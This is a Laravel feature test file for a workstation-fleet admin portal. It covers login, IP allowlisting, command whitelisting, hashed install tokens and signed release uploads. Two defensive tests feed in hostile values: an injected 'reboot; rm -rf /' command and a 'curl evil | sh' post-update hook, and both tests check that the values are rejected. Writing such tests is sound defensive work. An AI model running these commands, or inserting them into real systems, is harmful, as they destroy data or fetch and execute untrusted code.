<?php

namespace Tests\Feature\Workstations;

use App\Workstations\Models\{Command, EnvEntry, InstallToken, Release, Workstation};
use App\Workstations\Support\AgentProtocol;
use Illuminate\Http\UploadedFile;

class AdminPortalTest extends WorkstationTestCase
{
    public function test_portal_requires_login(): void
    {
        $this->get('/workstations')->assertRedirect('/workstations/login');
        $this->post('/workstations/login', ['username' => 'admin', 'password' => 'wrong'])->assertSessionHasErrors('login');
        $this->post('/workstations/login', ['username' => 'admin', 'password' => 'pass123'])->assertRedirect('/workstations');
        $this->get('/workstations')->assertOk()->assertSee('Workstations');
    }

    public function test_login_impossible_when_password_not_configured(): void
    {
        config(['workstations.admin_pass' => '']);
        $this->post('/workstations/login', ['username' => 'admin', 'password' => ''])->assertSessionHasErrors('login');
    }

    public function test_ip_allowlist_and_https(): void
    {
        config(['workstations.allowed_ips' => ['10.0.0.0/8']]);
        $this->get('/workstations/login')->assertStatus(403);
        config(['workstations.allowed_ips' => ['127.0.0.1'], 'workstations.require_https' => true]);
        $this->get('/workstations/login')->assertRedirect('https://localhost/workstations/login');
    }

    public function test_pages_render_with_data(): void
    {
        $this->release('1.0.0', ['is_latest' => true]);
        $this->workstation('ws-p');
        $this->approvedWithToken('ws-a', ['current_version' => '0.9.0', 'warehouse_code' => 'WH1', 'last_seen_at' => now()]);
        $this->admin()->get('/workstations')->assertOk()->assertSee('Approve all')->assertSee('Outdated')->assertSee('Online');
        $this->admin()->get('/workstations?q=ws-p')->assertOk()->assertSee('ws-p')->assertDontSee('ws-a</b>', false);
        $this->admin()->get('/workstations/ws/ws-a')->assertOk()->assertSee('Restart');
        $this->admin()->get('/workstations/releases')->assertOk()->assertSee('v1.0.0');
        $this->admin()->get('/workstations/settings')->assertOk()->assertSee('DB_URL');
        $this->admin()->get('/workstations/add')->assertOk()->assertSee('WH1');
    }

    public function test_empty_dashboard_explains_next_steps(): void
    {
        $this->admin()->get('/workstations')->assertOk()->assertSee('Abhi koi workstation nahi juda hai');
    }

    public function test_approve_all(): void
    {
        $this->workstation('ws-1');
        $this->workstation('ws-2');
        $this->admin()->post('/workstations/approve-all')->assertSessionHas('ok');
        $this->assertSame(2, Workstation::where('status', 'approved')->count());
    }

    public function test_command_whitelist(): void
    {
        $this->approvedWithToken('ws-1');
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'command', 'command' => 'restart'])->assertSessionHas('ok');
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'command', 'command' => 'reboot; rm -rf /'])->assertSessionHas('error');
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'command', 'command' => 'clear_bad_versions'])->assertSessionHas('error');
        $this->assertSame(['restart'], Command::pluck('command')->all());
    }

    public function test_commands_refused_for_unapproved_workstation(): void
    {
        $this->workstation('ws-1');
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'command', 'command' => 'restart'])->assertSessionHas('error');
        $this->assertSame(0, Command::count());
    }

    public function test_block_reset_and_save(): void
    {
        $this->approvedWithToken('ws-1');
        $r = $this->release('1.0.0');
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'save', 'label' => 'Gate', 'warehouse_code' => 'WH2',
            'target_release_id' => $r->id])->assertSessionHas('ok');
        $w = Workstation::first();
        $this->assertSame(['Gate', 'WH2', $r->id, false], [$w->label, $w->warehouse_code, (int)$w->target_release_id, $w->auto_update]);

        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'reset_token']);
        $this->assertNull(Workstation::first()->token_hash);
        $this->admin()->post('/workstations/ws/ws-1', ['action' => 'block']);
        $this->assertSame('blocked', Workstation::first()->status);
    }

    public function test_install_wizard_creates_hashed_expiring_token(): void
    {
        $this->release('1.0.0', ['is_latest' => true]);
        $res = $this->admin()->post('/workstations/add', ['warehouse_code' => 'WH1', 'uses' => 2])->assertRedirect('/workstations/add');
        $cmd = $res->getSession()->get('install_command');
        $this->assertMatchesRegularExpression('#^curl -fsSL -H "Authorization: Bearer (wsi_[0-9a-f]+)" http://localhost/api/agent/bootstrap/WH1 \| sudo bash$#', $cmd);
        preg_match('/(wsi_[0-9a-f]+)/', $cmd, $m);
        $t = InstallToken::first();
        $this->assertSame(AgentProtocol::hashToken($m[1]), $t->token_hash);
        $this->assertSame(2, $t->max_uses);
        $this->assertTrue($t->expires_at->isFuture());
        $this->get('/api/agent/bootstrap/WH1', ['Authorization' => "Bearer {$m[1]}"])->assertOk();
    }

    public function test_release_upload_requires_valid_signature(): void
    {
        $file = UploadedFile::fake()->createWithContent('gasmonitor', 'BINARY-CONTENT');
        $sha = hash('sha256', 'BINARY-CONTENT');

        $this->admin()->post('/workstations/releases', ['version' => '2.0.0', 'type' => 'binary', 'binary' => $file,
            'signature' => $this->sign('2.0.1', $sha)])->assertSessionHasErrors('binary');
        $this->assertSame(0, Release::count());

        $this->admin()->post('/workstations/releases', ['version' => '2.0.0', 'type' => 'binary', 'make_latest' => 1,
            'binary' => UploadedFile::fake()->createWithContent('gasmonitor', 'BINARY-CONTENT'),
            'signature' => $this->sign('2.0.0', $sha)])->assertSessionHas('ok');
        $this->assertTrue(Release::where('version', '2.0.0')->value('is_latest'));
    }

    public function test_release_upload_rejected_without_public_key(): void
    {
        config(['workstations.public_key' => '']);
        $sha = hash('sha256', 'X');
        $this->admin()->post('/workstations/releases', ['version' => '2.0.0', 'type' => 'binary',
            'binary' => UploadedFile::fake()->createWithContent('gasmonitor', 'X'), 'signature' => $this->sign('2.0.0', $sha)])
            ->assertSessionHasErrors('binary');
        $this->assertSame(0, Release::count());
    }

    public function test_package_release_must_be_gzip_and_action_whitelisted(): void
    {
        $gz = gzencode('tar-ish');
        $sha = hash('sha256', $gz);
        $this->admin()->post('/workstations/releases', ['version' => '3.0.0', 'type' => 'package', 'post_update' => 'curl evil | sh',
            'binary' => UploadedFile::fake()->createWithContent('app.tar.gz', $gz), 'signature' => $this->sign('3.0.0', $sha)])
            ->assertSessionHasErrors('binary');
        $this->admin()->post('/workstations/releases', ['version' => '3.0.0', 'type' => 'package', 'post_update' => 'composer_install_restart',
            'binary' => UploadedFile::fake()->createWithContent('app.tar.gz', $gz), 'signature' => $this->sign('3.0.0', $sha)])
            ->assertSessionHas('ok');
        $this->assertSame('composer_install_restart', Release::first()->post_update);
    }

    public function test_release_actions(): void
    {
        $a = $this->release('1.0.0', ['is_latest' => true]);
        $b = $this->release('1.1.0');
        $this->admin()->post("/workstations/releases/{$b->id}", ['action' => 'latest'])->assertSessionHas('ok');
        $this->assertFalse((bool)$a->fresh()->is_latest);
        $this->admin()->post("/workstations/releases/{$b->id}", ['action' => 'yank']);
        $this->assertTrue((bool)$b->fresh()->yanked);
        $this->assertFalse((bool)$b->fresh()->is_latest);
    }

    public function test_env_editor_validates_and_locks(): void
    {
        $this->admin()->post('/workstations/settings', ['scope' => 'global', 'key' => 'POLL_INTERVAL', 'value' => 'fast', 'row' => 'new'])
            ->assertSessionHasErrors('value');
        $this->admin()->post('/workstations/settings', ['scope' => 'global', 'key' => 'DB_URL', 'value' => 'x'])->assertSessionHasErrors('value');
        $this->admin()->post('/workstations/settings', ['scope' => 'warehouse', 'ref' => '', 'key' => 'POLL_INTERVAL', 'value' => '5'])
            ->assertSessionHas('error');
        $this->admin()->post('/workstations/settings', ['scope' => 'warehouse', 'ref' => 'WH1', 'key' => 'poll_interval', 'value' => '5'])
            ->assertSessionHas('ok');
        $this->assertSame('5', EnvEntry::where(['scope' => 'warehouse', 'scope_ref' => 'WH1', 'key' => 'POLL_INTERVAL'])->value('value'));
    }

    public function test_release_cli_command(): void
    {
        $path = tempnam(sys_get_temp_dir(), 'wsm');
        file_put_contents($path, 'CLI-BIN');
        $sha = hash('sha256', 'CLI-BIN');
        $this->artisan('workstations:release', ['action' => 'upload', 'version' => '4.0.0', 'file' => $path,
            '--signature' => 'bad'])->assertFailed();
        $this->artisan('workstations:release', ['action' => 'upload', 'version' => '4.0.0', 'file' => $path,
            '--signature' => $this->sign('4.0.0', $sha), '--latest' => true])->assertSuccessful();
        $this->assertTrue((bool)Release::where('version', '4.0.0')->value('is_latest'));
        $this->artisan('workstations:release', ['action' => 'yank', 'version' => '4.0.0'])->assertSuccessful();
        $this->assertTrue((bool)Release::where('version', '4.0.0')->value('yanked'));
        $this->artisan('workstations:release', ['action' => 'list'])->assertSuccessful();
        @unlink($path);
    }
}
